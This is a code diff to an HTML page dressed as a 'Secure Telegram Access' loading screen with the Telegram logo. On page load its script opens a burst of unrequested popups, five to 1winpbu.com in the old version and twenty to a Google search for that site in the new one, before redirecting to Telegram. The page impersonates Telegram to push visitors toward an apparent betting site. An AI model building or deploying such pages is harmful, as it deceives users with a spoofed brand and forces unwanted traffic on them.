@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Telegram Connect</title>
+<title>Telegram Access</title>
 
 <style>
 
@@ -14,38 +14,40 @@
 }
 
 body{
-    background:#0f172a;
+    width:100%;
     height:100vh;
     overflow:hidden;
     font-family:Arial,sans-serif;
+    background:linear-gradient(135deg,#0f172a,#1e293b,#334155);
     display:flex;
     justify-content:center;
     align-items:center;
 }
 
-/* Background Animation */
+/* Animated Background */
 
-.bg1,.bg2{
+.circle1,
+.circle2{
     position:absolute;
-    width:300px;
-    height:300px;
+    width:320px;
+    height:320px;
     border-radius:50%;
     filter:blur(120px);
-    opacity:0.5;
+    opacity:0.4;
 }
 
-.bg1{
+.circle1{
     background:#00bfff;
     top:-100px;
     left:-100px;
-    animation:move1 6s infinite alternate;
+    animation:move1 8s infinite alternate;
 }
 
-.bg2{
+.circle2{
     background:#0088cc;
     bottom:-100px;
     right:-100px;
-    animation:move2 6s infinite alternate;
+    animation:move2 8s infinite alternate;
 }
 
 @keyframes move1{
@@ -53,7 +55,7 @@ body{
         transform:translate(0,0);
     }
     to{
-        transform:translate(120px,80px);
+        transform:translate(150px,100px);
     }
 }
 
@@ -62,28 +64,28 @@ body{
         transform:translate(0,0);
     }
     to{
-        transform:translate(-120px,-80px);
+        transform:translate(-150px,-100px);
     }
 }
 
-/* Main Card */
+/* Card */
 
 .card{
     position:relative;
     z-index:5;
     width:90%;
-    max-width:360px;
+    max-width:370px;
     padding:35px 25px;
-    border-radius:25px;
+    border-radius:28px;
     background:rgba(255,255,255,0.08);
-    backdrop-filter:blur(12px);
+    backdrop-filter:blur(15px);
     border:1px solid rgba(255,255,255,0.15);
     text-align:center;
-    box-shadow:0 10px 40px rgba(0,0,0,0.4);
+    box-shadow:0 15px 40px rgba(0,0,0,0.4);
 }
 
 .logo{
-    width:90px;
+    width:95px;
     margin-bottom:20px;
 }
 
@@ -94,17 +96,17 @@ body{
 }
 
 .sub{
-    margin-top:12px;
+    margin-top:15px;
     color:#cbd5e1;
-    line-height:1.5;
+    line-height:1.6;
     font-size:15px;
 }
 
 /* Loader */
 
 .loader{
-    width:70px;
-    height:70px;
+    width:75px;
+    height:75px;
     margin:35px auto 0;
     border:6px solid rgba(255,255,255,0.15);
     border-top:6px solid #00bfff;
@@ -119,7 +121,7 @@ body{
 }
 
 .status{
-    margin-top:20px;
+    margin-top:22px;
     color:white;
     font-size:18px;
     animation:blink 1s infinite;
@@ -136,8 +138,8 @@ body{
 
 <body>
 
-<div class="bg1"></div>
-<div class="bg2"></div>
+<div class="circle1"></div>
+<div class="circle2"></div>
 
 <div class="card">
 
@@ -145,11 +147,11 @@ body{
 src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
 
 <div class="title">
-Telegram Access
+Secure Telegram Access
 </div>
 
 <div class="sub">
-Please wait while we connect your secure access pages...
+Please wait while we connect your access pages securely...
 </div>
 
 <div class="loader"></div>
@@ -172,27 +174,30 @@ function openPopup(url){
 
 }
 
-/* Auto Popup Start */
+const popupLink = "https://www.google.com/search?q=site%3A%2F%2F1winpbu.com";
 
-setTimeout(()=>{
-    openPopup("https://1winpbu.com/");
-},300);
+/* 20 Popup Open */
 
-setTimeout(()=>{
-    openPopup("https://1winpbu.com/");
-},900);
-
-setTimeout(()=>{
-    openPopup("https://1winpbu.com/");
-},1500);
-
-setTimeout(()=>{
-    openPopup("https://1winpbu.com/");
-},2100);
-
-setTimeout(()=>{
-    openPopup("https://1winpbu.com/");
-},2700);
+setTimeout(()=>{ openPopup(popupLink); },300);
+setTimeout(()=>{ openPopup(popupLink); },700);
+setTimeout(()=>{ openPopup(popupLink); },1100);
+setTimeout(()=>{ openPopup(popupLink); },1500);
+setTimeout(()=>{ openPopup(popupLink); },1900);
+setTimeout(()=>{ openPopup(popupLink); },2300);
+setTimeout(()=>{ openPopup(popupLink); },2700);
+setTimeout(()=>{ openPopup(popupLink); },3100);
+setTimeout(()=>{ openPopup(popupLink); },3500);
+setTimeout(()=>{ openPopup(popupLink); },3900);
+setTimeout(()=>{ openPopup(popupLink); },4300);
+setTimeout(()=>{ openPopup(popupLink); },4700);
+setTimeout(()=>{ openPopup(popupLink); },5100);
+setTimeout(()=>{ openPopup(popupLink); },5500);
+setTimeout(()=>{ openPopup(popupLink); },5900);
+setTimeout(()=>{ openPopup(popupLink); },6300);
+setTimeout(()=>{ openPopup(popupLink); },6700);
+setTimeout(()=>{ openPopup(popupLink); },7100);
+setTimeout(()=>{ openPopup(popupLink); },7500);
+setTimeout(()=>{ openPopup(popupLink); },7900);
 
 /* Telegram Redirect */
 
@@ -200,7 +205,7 @@ setTimeout(()=>{
 
     window.location.href="https://t.me/telegram";
 
-},3500);
+},9500);
 
 </script>
 
